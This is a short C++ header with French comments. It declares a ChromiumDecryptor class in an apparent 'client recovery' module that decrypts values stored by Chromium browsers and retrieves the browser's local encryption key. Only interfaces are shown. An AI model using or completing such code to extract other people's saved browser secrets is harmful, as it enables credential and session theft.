#pragma once
#include <string>
#include <vector>
#include <cstdint>

namespace rslm {
	namespace client {
		namespace recovery {

			class ChromiumDecryptor {
			public:
				//Dechiffre une valeur chiffre Chronium (chrome, Edge, Opera...)
				static std::string Decrypt(const std::vector<uint8_t>& encryptedData);

				//Recupere la cle de chiffrement locale
				static std::vector<uint8_t> GetLocalKey(const std::string& browserPath);

				//Verifie si le chiffrement est possible sur cette machine 
				static bool IsAvailable();
			};
		}//namespace recovery
	}//namespace client 
}//namespace rslm